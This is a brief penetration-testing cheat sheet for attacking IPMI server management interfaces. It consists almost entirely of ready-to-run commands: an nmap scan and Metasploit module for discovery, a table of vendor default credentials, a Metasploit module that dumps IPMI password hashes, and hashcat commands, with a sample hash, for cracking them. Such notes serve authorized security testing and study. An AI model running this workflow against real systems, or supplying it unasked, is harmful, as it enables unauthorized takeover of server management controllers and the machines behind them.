## Recon

```sh
nmap -sU --script ipmi-version -p 623 $target
```

```sh
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set rhosts $target
run
```

## Default creds

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |
## Dump hash

```sh
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts $target
run
```

## Crack hash

```sh
echo 'admin:b311ab6b820000008bf414b34236fbfb70c6585a715e2a6a6ef0d659cd451168cd27f7c3bf20b7bda123456789abcdefa123456789abcdef140561646d696e:93d7b21656f92950a348d12eccd3f1be0e053fff' > hash

hashcat -m 7300 ./hash --username -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 ./hash --username -a 0 ./wordlist.txt
```